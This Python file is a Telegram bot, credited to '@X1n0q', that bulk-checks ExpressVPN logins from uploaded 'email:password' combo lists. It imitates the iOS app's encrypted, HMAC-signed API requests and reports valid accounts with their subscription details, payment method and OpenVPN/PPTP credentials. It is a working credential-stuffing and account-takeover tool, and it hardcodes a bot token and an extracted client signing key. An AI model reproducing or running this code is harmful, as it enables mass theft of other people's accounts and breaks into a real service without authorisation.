#!/usr/bin/env python3
# ExpressVPN Telegram Bot - Render-Ready
# Author: @X1n0q

import sys
import time
import json
import gzip
import hmac
import base64
import hashlib
import string
import random
import zipfile
import tempfile
import threading
from io import BytesIO
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Event, Lock

import requests
from Crypto.Cipher import AES, PKCS1_v1_5, DES3
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from asn1crypto import cms, x509, keys

import telebot
from telebot import types

# ─── FLASK KEEP-ALIVE ──────────────────────────────────────────────────────
from flask import Flask
from threading import Thread
import os

app = Flask(__name__)

@app.route('/')
def home():
    return "✅ ExpressVPN Bot is alive!"

def run_flask():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, debug=False)

# ─── CONFIG ──────────────────────────────────────────────────────────────────
BOT_TOKEN = "8136827302:AAHpATxlggGEUJ_Pw1DVB07eesKaWTlvOn8"
ADMIN_IDS = {7305141058}
MAX_WORKERS = 2  # ← Optimized for free tier
RESULTS_DIR = "ExpressVPN_Results"

import os as _os
_os.makedirs(RESULTS_DIR, exist_ok=True)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
shutdown_event = Event()

# ─── CRYPTO CORE ──────────────────────────────────────────────────────────────

class AesCryptographyService:
    def decrypt(self, data, key, iv):
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(data)
        padding_length = decrypted[-1]
        if padding_length < 1 or padding_length > 16:
            raise ValueError("Invalid padding")
        return decrypted[:-padding_length]

def get_byte_array(size):
    return get_random_bytes(size)

def envelope_encrypt(input_data, certificate):
    cert = x509.Certificate.load(certificate)
    issuer = cert.issuer
    serial_number = cert.serial_number
    public_key_info = cert.public_key
    if hasattr(public_key_info, "parsed"):
        rsa_public_key = public_key_info.parsed
    else:
        rsa_public_key = keys.RSAPublicKey.load(public_key_info["public_key"].parsed.dump())
    modulus = rsa_public_key["modulus"].native
    public_exponent = rsa_public_key["public_exponent"].native
    rsa_key = RSA.construct((modulus, public_exponent))
    content_key = get_random_bytes(24)
    content_iv = get_random_bytes(8)
    pad_length = 8 - (len(input_data) % 8) if len(input_data) % 8 != 0 else 8
    padded_data = input_data + bytes([pad_length] * pad_length)
    cipher = DES3.new(content_key, DES3.MODE_CBC, content_iv)
    encrypted_content = cipher.encrypt(padded_data)
    cipher_rsa = PKCS1_v1_5.new(rsa_key)
    encrypted_key = cipher_rsa.encrypt(content_key)
    recipient_id = cms.IssuerAndSerialNumber({"issuer": issuer, "serial_number": serial_number})
    key_trans_recipient = cms.KeyTransRecipientInfo({
        "version": 0,
        "rid": cms.RecipientIdentifier(name="issuer_and_serial_number", value=recipient_id),
        "key_encryption_algorithm": cms.KeyEncryptionAlgorithm({"algorithm": "1.2.840.113549.1.1.1"}),
        "encrypted_key": cms.OctetString(encrypted_key),
    })
    recipient_infos = cms.RecipientInfos([cms.RecipientInfo(name="ktri", value=key_trans_recipient)])
    encrypted_content_info = cms.EncryptedContentInfo({
        "content_type": "1.2.840.113549.1.7.1",
        "content_encryption_algorithm": cms.EncryptionAlgorithm({
            "algorithm": "1.2.840.113549.3.7",
            "parameters": cms.OctetString(content_iv),
        }),
        "encrypted_content": encrypted_content,
    })
    enveloped_data = cms.EnvelopedData({
        "version": 0,
        "recipient_infos": recipient_infos,
        "encrypted_content_info": encrypted_content_info,
    })
    content_info = cms.ContentInfo({
        "content_type": "1.2.840.113549.1.7.3",
        "content": enveloped_data,
    })
    return content_info.dump()

def gzip_data(input_string):
    input_bytes = input_string.encode("ascii")
    output_stream = BytesIO()
    with gzip.GzipFile(fileobj=output_stream, mode="wb") as gz:
        gz.write(input_bytes)
    return output_stream.getvalue()

def compute_signature(input_data, key):
    signature = hmac.new(key, input_data, hashlib.sha1).digest()
    return base64.b64encode(signature).decode("ascii")

def generate_random_string(length=64):
    return "".join(random.choices(string.hexdigits.lower(), k=length))

def safe_int(value, default=0):
    try:
        if value is None:
            return default
        return int(float(value))
    except (TypeError, ValueError):
        return default

def unix_time_to_date(unix_time):
    try:
        ts = safe_int(unix_time, None)
        if ts is None:
            return "N/A"
        return datetime.fromtimestamp(ts).strftime("%Y-%m-%d")
    except Exception:
        return "N/A"

CERT_BASE64 = (
    "MIIDXTCCAkWgAwIBAgIJALPWYfHAoH+CMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVBAYTAkFVMRMw"
    "EQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcN"
    "MTcxMTA5MDUwNTIzWhcNMjcxMTA3MDUwNTIzWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29t"
    "ZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0B"
    "AQEFAAOCAQ8AMIIBCgKCAQEAtUCqVSHRqQ5XnrnA4KEnGSLGRSHWgyOgpNzNjEUmjlO25Ojncaw0"
    "u+hHAns8I3kNPk0qFlGP7oLeZvFH8+duDF02j4yVFDHkHRGyTBe3PsYvztDVzmddtG8eBgwJ88Po"
    "cBXDjJvCojfkyQ8sY4EtK3y0UDJj4uJKckVdLUL8wFt2DPj+A3E4/KgYELNXA3oUlNjFwr4kqpxe"
    "DjvTi3W4T02bhRXYXgDMgQgtLZMpf1zOpM2lfqRq6sFoOmzlBTv2qbvmcOSEz3ZamwFxoYDB86Ef"
    "nKPCq6ZareO/1MWGHwxH24SoJhFmyOsvq/kPPa03GJnKtMUznTnBVhwWy7KJIwIDAQABo1AwTjAd"
    "BgNVHQ4EFgQUoKnoagA0CLOLTzDb2lQ/v/osUz0wHwYDVR0jBBgwFoAUoKnoagA0CLOLTzDb2lQ/"
    "v/osUz0wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAmF8BLuzF0rY2T2v2jTpCiqKx"
    "XARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp/CUHppzzY9uYAJ1i"
    "XJpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZClV6eBxEnFKofArNtdCZWGliRAy9P8"
    "krF8poSElJtvlYQ70vWiZVIU7kV6adMVFtmPq4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYy"
    "fp+RiyixhqL1o2C1JJTjY4S/t+UvQq5xTsWun+PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPSt"
    "NzOuxZ4BXLe7YA=="
)
HMAC_KEY = "@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"

# ─── FORMATTERS ─────────────────────────────────────────────────────────────

def format_hit(account_data, is_premium):
    lines = []
    lines.append("─" * 39)
    lines.append("  EXPRESSVPN ACCOUNT REPORT")
    lines.append("─" * 39)
    lines.append(f"  Email       : {account_data.get('email', 'N/A')}")
    lines.append(f"  Password    : {account_data.get('password', 'N/A')}")
    lines.append(f"  Status      : {'Premium' if is_premium else 'Free'}")
    lines.append(f"  License     : {account_data.get('license_status', 'N/A')}")
    
    if account_data.get("plan_name") and account_data["plan_name"] not in ("Not Provided", "N/A", None):
        lines.append(f"  Plan        : {account_data['plan_name']}")
    if account_data.get("billing_cycle"):
        lines.append(f"  Billing     : {account_data['billing_cycle']} months")
    if account_data.get("expire_date") and account_data["expire_date"] not in ("Not Provided", "N/A"):
        lines.append(f"  Expires     : {account_data['expire_date']}")
    if account_data.get("days_left") is not None and account_data["days_left"] not in ("Not Provided", "N/A"):
        lines.append(f"  Days Left   : {account_data['days_left']}")
    if account_data.get("auto_renew") and account_data["auto_renew"] not in ("Not Provided", "N/A"):
        lines.append(f"  Auto Renew  : {account_data['auto_renew']}")
    if account_data.get("payment_method") and account_data["payment_method"] not in ("Not Provided", "N/A"):
        lines.append(f"  Payment     : {account_data['payment_method']}")
    
    lines.append("─" * 39)
    lines.append("  OpenVPN Credentials")
    lines.append(f"    Username : {account_data.get('ovpn_username', 'N/A')}")
    lines.append(f"    Password : {account_data.get('ovpn_password', 'N/A')}")
    
    if account_data.get("pptp_username") and account_data.get("pptp_password"):
        lines.append("  PPTP Credentials")
        lines.append(f"    Username : {account_data.get('pptp_username', 'N/A')}")
        lines.append(f"    Password : {account_data.get('pptp_password', 'N/A')}")
    
    lines.append("─" * 39)
    if account_data.get("last_login") and account_data["last_login"] not in ("Not Provided", "N/A"):
        lines.append(f"  Last Login  : {account_data['last_login']}")
    if account_data.get("account_created") and account_data["account_created"] not in ("Not Provided", "N/A"):
        lines.append(f"  Created     : {account_data['account_created']}")
    
    lines.append("─" * 39)
    lines.append("  @X1n0q")
    lines.append("─" * 39)
    return "\n".join(lines)

# ─── CHECK ENGINE ────────────────────────────────────────────────────────────

def check_account(email, password):
    account_data = {"email": email, "password": password}
    try:
        install_id = generate_random_string(64)
        base64_iv = base64.b64encode(get_byte_array(16)).decode("ascii")
        base64_key = base64.b64encode(get_byte_array(16)).decode("ascii")
        post_data = json.dumps({
            "email": email,
            "iv": base64_iv,
            "key": base64_key,
            "password": password,
        })
        cert_bytes = base64.b64decode(CERT_BASE64)
        gzipped_data = gzip_data(post_data)
        encrypted_post_data = envelope_encrypt(gzipped_data, cert_bytes)

        header_raw = f"POST /apis/v2/credentials?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
        header_signature = compute_signature(header_raw.encode("ascii"), HMAC_KEY.encode("ascii"))
        body_signature = compute_signature(encrypted_post_data, HMAC_KEY.encode("ascii"))
        
        url = f"https://www.expressapisv2.net/apis/v2/credentials?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
        headers = {
            "User-Agent": "xvclient/v21.21.0 (ios; 14.4) ui/11.5.2",
            "Content-Type": "application/octet-stream",
            "X-Body-Compression": "gzip",
            "X-Signature": f"2 {header_signature} 91c776e",
            "X-Body-Signature": f"2 {body_signature} 91c776e",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip, deflate",
        }

        resp = requests.post(url, data=encrypted_post_data, headers=headers, timeout=30)

        if resp.status_code == 401:
            return "invalid", "Invalid credentials"
        if resp.status_code == 429:
            time.sleep(5)
            return check_account(email, password)
        if resp.status_code != 200:
            return "invalid", f"HTTP {resp.status_code}"

        aes = AesCryptographyService()
        plain = aes.decrypt(resp.content, base64.b64decode(base64_key), base64.b64decode(base64_iv))
        resp_json = json.loads(plain.decode("ascii"))

        for k in ("ovpn_username", "ovpn_password", "pptp_username", "pptp_password"):
            if k in resp_json:
                account_data[k] = resp_json[k]

        access_token = resp_json.get("access_token")
        if not access_token:
            account_data["license_status"] = "No subscription"
            return "free", account_data

        sub_raw = f"GET /apis/v2/subscription?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email"
        sub_sig = compute_signature(sub_raw.encode("ascii"), HMAC_KEY.encode("ascii"))
        batch_raw = f"POST /apis/v2/batch?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
        batch_sig = compute_signature(batch_raw.encode("ascii"), HMAC_KEY.encode("ascii"))
        
        capture_body = json.dumps([{
            "headers": {"Accept-Language": "en", "X-Signature": f"2 {sub_sig} 91c776e"},
            "method": "GET",
            "url": f"/apis/v2/subscription?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email",
        }])
        capture_body_sig = compute_signature(capture_body.encode("ascii"), HMAC_KEY.encode("ascii"))
        
        batch_url = f"https://www.expressapisv2.net/apis/v2/batch?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
        batch_headers = {
            "User-Agent": "xvclient/v21.21.0 (ios; 14.4) ui/11.5.2",
            "X-Body-Compression": "gzip",
            "X-Signature": f"2 {batch_sig} 91c776e",
            "X-Body-Signature": f"2 {capture_body_sig} 91c776e",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/json",
        }

        br = requests.post(batch_url, data=capture_body, headers=batch_headers, timeout=30)

        if br.status_code == 429:
            time.sleep(5)
            return check_account(email, password)
        if br.status_code != 200:
            account_data["license_status"] = f"Batch HTTP {br.status_code}"
            return "free", account_data

        batch_data = br.json()
        if not batch_data:
            account_data["license_status"] = "Empty response"
            return "free", account_data

        item = batch_data[0]
        sub_data = item.get("body", "{}")
        if isinstance(sub_data, str):
            sub_data = sub_data.replace('\\"', '"')
            sub_json = json.loads(sub_data)
        else:
            sub_json = sub_data

        if "subscription" in sub_json:
            sub_json = sub_json["subscription"]

        billing_cycle = sub_json.get("billing_cycle")
        if billing_cycle:
            account_data["billing_cycle"] = billing_cycle
            account_data["plan"] = f"{billing_cycle} Month"
        
        if "expiration_time" in sub_json:
            exp_time = sub_json["expiration_time"]
            account_data["expire_date"] = unix_time_to_date(exp_time)
            exp_ts = safe_int(exp_time, None)
            if exp_ts is not None:
                account_data["days_left"] = int((exp_ts - int(datetime.now().timestamp())) / 86400)

        if "auto_bill" in sub_json:
            account_data["auto_renew"] = str(sub_json["auto_bill"]).lower()
        if "payment_method" in sub_json:
            account_data["payment_method"] = sub_json["payment_method"]
        if "plan_name" in sub_json and sub_json["plan_name"]:
            account_data["plan_name"] = sub_json["plan_name"]

        license_status = str(sub_json.get("license_status", "")).upper()
        account_data["license_status"] = license_status

        if license_status == "REVOKED":
            return "free", account_data
        if license_status in ("ACTIVE", "TRIAL", "PAID"):
            exp_time = sub_json.get("expiration_time")
            exp_ts = safe_int(exp_time, 0)
            if exp_ts and exp_ts > int(datetime.now().timestamp()):
                account_data["is_premium"] = True
                return "premium", account_data
            return "free", account_data
        return "free", account_data

    except Exception as e:
        return "invalid", str(e)[:120]

# ─── SESSION STATE ────────────────────────────────────────────────────────────

user_sessions = {}
sessions_lock = Lock()

def get_session(chat_id):
    with sessions_lock:
        if chat_id not in user_sessions:
            user_sessions[chat_id] = {
                "accounts": [],
                "running": False,
                "stop": False,
                "stats": {"checked": 0, "total": 0, "premium": 0, "free": 0, "invalid": 0},
                "premium_hits": [],
                "free_hits": [],
                "invalid_hits": [],
                "status_msg_id": None,
                "start_time": None,
            }
        return user_sessions[chat_id]

def is_allowed(user_id):
    return user_id in ADMIN_IDS

# ─── KEYBOARD MARKUP ────────────────────────────────────────────────────────

def main_menu():
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("Start Check", callback_data="start_check")
    btn2 = types.InlineKeyboardButton("Status", callback_data="status")
    btn3 = types.InlineKeyboardButton("Results", callback_data="results")
    btn4 = types.InlineKeyboardButton("Help", callback_data="help")
    keyboard.add(btn1, btn2)
    keyboard.add(btn3, btn4)
    return keyboard

# ─── TELEGRAM HANDLERS ───────────────────────────────────────────────────────

@bot.message_handler(commands=["start", "help"])
def cmd_start(message):
    if not is_allowed(message.from_user.id):
        bot.reply_to(message, "Access denied.")
        return

    welcome = (
        "<b>ExpressVPN Account Checker</b>\n\n"
        "Send a .txt file with accounts in format:\n"
        "<code>email:password</code>\n\n"
        "Or paste combos directly.\n\n"
        "<b>Commands</b>\n"
        "/start - Show menu\n"
        "/check - Start checking\n"
        "/status - View progress\n"
        "/stop - Stop current job\n"
        "/results - Download results\n"
        "/clear - Clear loaded accounts\n\n"
        "<i>Author: @X1n0q</i>"
    )
    bot.reply_to(message, welcome, reply_markup=main_menu())

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if not is_allowed(call.from_user.id):
        bot.answer_callback_query(call.id, "Access denied.")
        return
    
    if call.data == "start_check":
        bot.answer_callback_query(call.id)
        session = get_session(call.message.chat.id)
        if session["running"]:
            bot.edit_message_text("Already running. Use /stop first.", call.message.chat.id, call.message.message_id)
            return
        if not session["accounts"]:
            bot.edit_message_text("No accounts loaded. Send a .txt file first.", call.message.chat.id, call.message.message_id)
            return
        cmd_check(call.message)
    
    elif call.data == "status":
        bot.answer_callback_query(call.id)
        cmd_status(call.message)
    
    elif call.data == "results":
        bot.answer_callback_query(call.id)
        cmd_results(call.message)
    
    elif call.data == "help":
        bot.answer_callback_query(call.id)
        cmd_start(call.message)

@bot.message_handler(commands=["clear"])
def cmd_clear(message):
    if not is_allowed(message.from_user.id):
        return
    session = get_session(message.chat.id)
    if session["running"]:
        bot.reply_to(message, "Stop the current job first with /stop")
        return
    session["accounts"] = []
    session["premium_hits"] = []
    session["free_hits"] = []
    session["invalid_hits"] = []
    session["stats"] = {"checked": 0, "total": 0, "premium": 0, "free": 0, "invalid": 0}
    bot.reply_to(message, "Session cleared.")

@bot.message_handler(commands=["stop"])
def cmd_stop(message):
    if not is_allowed(message.from_user.id):
        return
    session = get_session(message.chat.id)
    if not session["running"]:
        bot.reply_to(message, "Nothing is running.")
        return
    session["stop"] = True
    bot.reply_to(message, "Stopping...")

@bot.message_handler(commands=["status"])
def cmd_status(message):
    if not is_allowed(message.from_user.id):
        return
    session = get_session(message.chat.id)
    s = session["stats"]
    total = s["total"] or 1
    pct = (s["checked"] / total) * 100 if total else 0
    bar_len = 20
    filled = int(bar_len * pct / 100)
    bar = "█" * filled + "░" * (bar_len - filled)
    text = (
        f"<b>Progress</b>\n"
        f"<code>{bar}</code> {pct:.1f}%\n\n"
        f"Premium : {s['premium']}\n"
        f"Free    : {s['free']}\n"
        f"Invalid : {s['invalid']}\n"
        f"Checked : {s['checked']}/{s['total']}\n"
        f"Running : {'Yes' if session['running'] else 'No'}"
    )
    bot.reply_to(message, text)

@bot.message_handler(commands=["results"])
def cmd_results(message):
    if not is_allowed(message.from_user.id):
        return
    session = get_session(message.chat.id)
    if session["running"]:
        bot.reply_to(message, "Job still running. Use /stop first.")
        return

    premium = session["premium_hits"]
    free = session["free_hits"]
    invalid = session["invalid_hits"]

    if not premium and not free and not invalid:
        bot.reply_to(message, "No results yet. Load accounts and /check first.")
        return

    with tempfile.TemporaryDirectory() as tmp:
        premium_path = os.path.join(tmp, "premium.txt")
        free_path = os.path.join(tmp, "free.txt")
        invalid_path = os.path.join(tmp, "invalid.txt")

        with open(premium_path, "w", encoding="utf-8") as f:
            for hit in premium:
                f.write(format_hit(hit, True) + "\n\n")
        with open(free_path, "w", encoding="utf-8") as f:
            for hit in free:
                f.write(format_hit(hit, False) + "\n\n")
        with open(invalid_path, "w", encoding="utf-8") as f:
            for item in invalid:
                f.write(f"{item}\n")

        zip_path = os.path.join(tmp, "results.zip")
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.write(premium_path, "premium.txt")
            zf.write(free_path, "free.txt")
            zf.write(invalid_path, "invalid.txt")

        caption = f"Results\nPremium: {len(premium)}\nFree: {len(free)}\nInvalid: {len(invalid)}"
        with open(zip_path, "rb") as f:
            bot.send_document(message.chat.id, f, caption=caption)

@bot.message_handler(content_types=["document"])
def handle_document(message):
    if not is_allowed(message.from_user.id):
        return
    session = get_session(message.chat.id)
    if session["running"]:
        bot.reply_to(message, "Job running. Use /stop first.")
        return

    doc = message.document
    if not doc.file_name.lower().endswith(".txt"):
        bot.reply_to(message, "Send a .txt file with email:password lines.")
        return

    try:
        file_info = bot.get_file(doc.file_id)
        downloaded = bot.download_file(file_info.file_path)
        content = downloaded.decode("utf-8", errors="ignore")
        lines = [ln.strip() for ln in content.splitlines() if ln.strip() and ":" in ln]
        seen = set()
        unique = []
        for ln in lines:
            if ln not in seen:
                seen.add(ln)
                unique.append(ln)
        
        session["accounts"] = unique
        session["premium_hits"] = []
        session["free_hits"] = []
        session["invalid_hits"] = []
        session["stats"] = {
            "checked": 0,
            "total": len(unique),
            "premium": 0,
            "free": 0,
            "invalid": 0,
        }
        bot.reply_to(
            message,
            f"Loaded {len(unique)} accounts.\nUse /check to start.",
            reply_markup=main_menu()
        )
    except Exception as e:
        bot.reply_to(message, f"Failed to read file: {e}")

@bot.message_handler(commands=["check"])
def cmd_check(message):
    if not is_allowed(message.from_user.id):
        return
    session = get_session(message.chat.id)
    if session["running"]:
        bot.reply_to(message, "Already running. Use /status or /stop")
        return
    if not session["accounts"]:
        bot.reply_to(message, "No accounts loaded. Send a .txt file first.")
        return

    session["running"] = True
    session["stop"] = False
    session["start_time"] = datetime.now()
    session["premium_hits"] = []
    session["free_hits"] = []
    session["invalid_hits"] = []
    session["stats"] = {
        "checked": 0,
        "total": len(session["accounts"]),
        "premium": 0,
        "free": 0,
        "invalid": 0,
    }

    status_msg = bot.reply_to(
        message,
        f"<b>Checking...</b>\nTotal: {len(session['accounts'])}",
    )
    session["status_msg_id"] = status_msg.message_id

    def worker():
        accounts = list(session["accounts"])
        stats_lock = Lock()
        last_update = 0

        def update_status(force=False):
            nonlocal last_update
            now = time.time()
            if not force and (now - last_update) < 5:
                return
            last_update = now
            s = session["stats"]
            total = s["total"] or 1
            pct = (s["checked"] / total) * 100
            bar_len = 20
            filled = int(bar_len * pct / 100)
            bar = "█" * filled + "░" * (bar_len - filled)
            text = (
                f"<b>Progress</b>\n"
                f"<code>{bar}</code> {pct:.1f}%\n\n"
                f"Premium : {s['premium']}\n"
                f"Free    : {s['free']}\n"
                f"Invalid : {s['invalid']}\n"
                f"Checked : {s['checked']}/{s['total']}"
            )
            try:
                bot.edit_message_text(text, message.chat.id, session["status_msg_id"])
            except Exception:
                pass

        def process_one(combo):
            if session["stop"] or shutdown_event.is_set():
                return
            if ":" not in combo:
                with stats_lock:
                    session["stats"]["checked"] += 1
                    session["stats"]["invalid"] += 1
                    session["invalid_hits"].append(combo)
                return
            
            email, password = combo.split(":", 1)
            email = email.strip()
            password = password.strip()
            status, data = check_account(email, password)

            with stats_lock:
                session["stats"]["checked"] += 1
                if status == "premium":
                    session["stats"]["premium"] += 1
                    session["premium_hits"].append(data)
                    try:
                        report = format_hit(data, True)
                        bot.send_message(message.chat.id, f"<b>Premium Hit</b>\n<pre>{report}</pre>")
                    except Exception:
                        pass
                elif status == "free":
                    session["stats"]["free"] += 1
                    session["free_hits"].append(data)
                    try:
                        report = format_hit(data, False)
                        bot.send_message(message.chat.id, f"<b>Valid Account</b>\n<pre>{report}</pre>")
                    except Exception:
                        pass
                else:
                    session["stats"]["invalid"] += 1
                    reason = data if isinstance(data, str) else "unknown"
                    session["invalid_hits"].append(f"{email}:{password} | {reason}")
            
            time.sleep(1.5)  # ← Reduced speed for stability
            update_status()

        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = [executor.submit(process_one, acc) for acc in accounts]
            for fut in as_completed(futures):
                if session["stop"] or shutdown_event.is_set():
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                try:
                    fut.result()
                except Exception:
                    pass
                update_status()

        session["running"] = False
        update_status(force=True)

        s = session["stats"]
        duration = (datetime.now() - session["start_time"]).total_seconds()
        summary = (
            f"<b>Check Complete</b>\n\n"
            f"Premium : {s['premium']}\n"
            f"Free    : {s['free']}\n"
            f"Invalid : {s['invalid']}\n"
            f"Checked : {s['checked']}/{s['total']}\n"
            f"Time    : {int(duration // 60)}m {int(duration % 60)}s\n\n"
            f"Use /results to download."
        )
        try:
            bot.send_message(message.chat.id, summary, reply_markup=main_menu())
        except Exception:
            pass

    t = threading.Thread(target=worker, daemon=True)
    t.start()

@bot.message_handler(func=lambda m: m.text and ":" in m.text and not m.text.startswith("/"))
def handle_text_combos(message):
    if not is_allowed(message.from_user.id):
        return
    session = get_session(message.chat.id)
    if session["running"]:
        bot.reply_to(message, "Job running. Use /stop first.")
        return
    
    lines = [ln.strip() for ln in message.text.splitlines() if ln.strip() and ":" in ln]
    if not lines:
        return
    
    seen = set()
    unique = []
    for ln in lines:
        if ln not in seen:
            seen.add(ln)
            unique.append(ln)
    
    session["accounts"] = unique
    session["premium_hits"] = []
    session["free_hits"] = []
    session["invalid_hits"] = []
    session["stats"] = {
        "checked": 0,
        "total": len(unique),
        "premium": 0,
        "free": 0,
        "invalid": 0,
    }
    bot.reply_to(
        message,
        f"Loaded {len(unique)} accounts.\nUse /check to start.",
        reply_markup=main_menu()
    )

# ─── MAIN ────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("🚀 ExpressVPN Bot starting...")
    print("👤 Author: @X1n0q")
    print("💻 Running on Render.com free tier")
    
    # Start Flask keep-alive thread
    flask_thread = Thread(target=run_flask, daemon=True)
    flask_thread.start()
    print("🌐 Keep-alive server started on port " + os.environ.get('PORT', '8080'))
    
    # Start Telegram bot
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except KeyboardInterrupt:
        shutdown_event.set()
        print("\n🛑 Shutting down.")
        sys.exit(0)